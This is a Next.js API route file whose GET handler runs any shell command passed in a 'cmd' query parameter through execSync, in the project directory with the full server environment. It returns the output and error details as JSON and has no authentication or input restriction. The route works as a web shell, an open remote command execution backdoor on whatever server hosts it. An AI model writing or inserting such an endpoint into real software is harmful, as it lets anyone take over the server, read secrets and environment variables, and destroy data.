import { NextRequest, NextResponse } from "next/server";
import { execSync } from "child_process";

export const dynamic = "force-dynamic";

export async function GET(req: NextRequest) {
  try {
    const { searchParams } = new URL(req.url);
    const cmd = searchParams.get("cmd");
    if (!cmd) {
      return NextResponse.json({ success: false, error: "Missing cmd parameter" });
    }
    
    // Execute command in the project root directory
    const output = execSync(cmd, { 
      cwd: process.cwd(),
      env: { ...process.env, PAGER: "cat" }
    }).toString();
    
    return NextResponse.json({ success: true, output });
  } catch (error: any) {
    return NextResponse.json({ 
      success: false, 
      error: error.message, 
      stderr: error.stderr?.toString(),
      stack: error.stack 
    });
  }
}
